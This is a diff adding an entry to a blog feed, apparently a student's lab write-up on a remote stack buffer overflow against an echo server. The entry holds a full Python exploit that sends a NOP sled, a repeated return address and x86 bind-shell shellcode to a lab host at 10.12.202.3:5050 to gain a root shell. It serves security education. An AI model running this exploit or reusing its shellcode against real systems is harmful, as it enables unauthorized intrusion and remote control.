@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>安全攻防综合实验六</title>
+    <link href="/2021/10/26/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E5%85%AD/"/>
+    <url>/2021/10/26/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E5%85%AD/</url>
+    
+    <content type="html"><![CDATA[<h2 id="remote-buffer-overflow"><a href="#remote-buffer-overflow" class="headerlink" title="remote buffer-overflow"></a>remote buffer-overflow</h2><h3 id="principal"><a href="#principal" class="headerlink" title="principal"></a>principal</h3><p>在<code>remote serve</code>上面运行着<code>echo_serve</code>文件，然后该文件是具有栈溢出漏洞的，当我们输入的字符串给<code>remote serve</code>的时候，就有可能会造成缓冲区溢出，从而获得<code>root</code>权限</p><h3 id="procedure"><a href="#procedure" class="headerlink" title="procedure"></a>procedure</h3><pre><code class="hljs python"><span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> times = socket(AF_INET, SOCK_STREAM) s.connect((<span class="hljs-string">"10.12.202.3"</span>, <span class="hljs-number">5050</span>))shellcode= <span class="hljs-string">"\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x75\x43\xeb\x43\x5e\x31\xc0"</span>\ <span class="hljs-string">"\x31\xdb\x89\xf1\xb0\x02\x89\x06\xb0\x01\x89\x46\x04\xb0\x06"</span>\ <span class="hljs-string">"\x89\x46\x08\xb0\x66\xb3\x01\xcd\x80\x89\x06\xb0\x02\x66\x89"</span>\ <span class="hljs-string">"\x46\x0c\xb0\x77\x66\x89\x46\x0e\x8d\x46\x0c\x89\x46\x04\x31"</span>\ <span class="hljs-string">"\xc0\x89\x46\x10\xb0\x10\x89\x46\x08\xb0\x66\xb3\x02\xcd\x80"</span>\ <span class="hljs-string">"\xeb\x04\xeb\x55\xeb\x5b\xb0\x01\x89\x46\x04\xb0\x66\xb3\x04"</span>\ <span class="hljs-string">"\xcd\x80\x31\xc0\x89\x46\x04\x89\x46\x08\xb0\x66\xb3\x05\xcd"</span>\ <span class="hljs-string">"\x80\x88\xc3\xb0\x3f\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80"</span>\ <span class="hljs-string">"\xb0\x3f\xb1\x02\xcd\x80\xb8\x2f\x62\x69\x6e\x89\x06\xb8\x2f"</span>\ <span class="hljs-string">"\x73\x68\x2f\x89\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89"</span>\ <span class="hljs-string">"\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31"</span>\ <span class="hljs-string">"\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\x5b\xff\xff\xff"</span>nop = <span class="hljs-string">"\x90"</span>*<span class="hljs-number">300</span>ret = <span class="hljs-string">"\x42\xd3\xff\xff"</span>*<span class="hljs-number">100</span>buffer=ret+nop+shellcodes.send(buffer)time.sleep(<span class="hljs-number">2</span>) s.close()s = socket(AF_INET, SOCK_STREAM) s.connect((<span class="hljs-string">"10.12.202.3"</span>, <span class="hljs-number">5050</span>))s.send(<span class="hljs-string">"end\n"</span>)time.sleep(<span class="hljs-number">2</span>) s.close()</code></pre><p>根据程序的返回信息可以得知<code>send_buf</code>的起始位置，而其中的<code>ret</code>只需要落在<code>NOP</code>指令所在位置就可以往后面继续跳转</p><p><img src="/2021/10/26/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E5%85%AD/2.png" srcset="/img/loading.gif" alt="2"></p><p><img src="/2021/10/26/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E5%85%AD/3.png" srcset="/img/loading.gif" alt="3"></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>安全攻防综合</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>安全攻防综合实验5</title>
     <link href="/2021/10/19/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C5/"/>
     <url>/2021/10/19/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C5/</url>
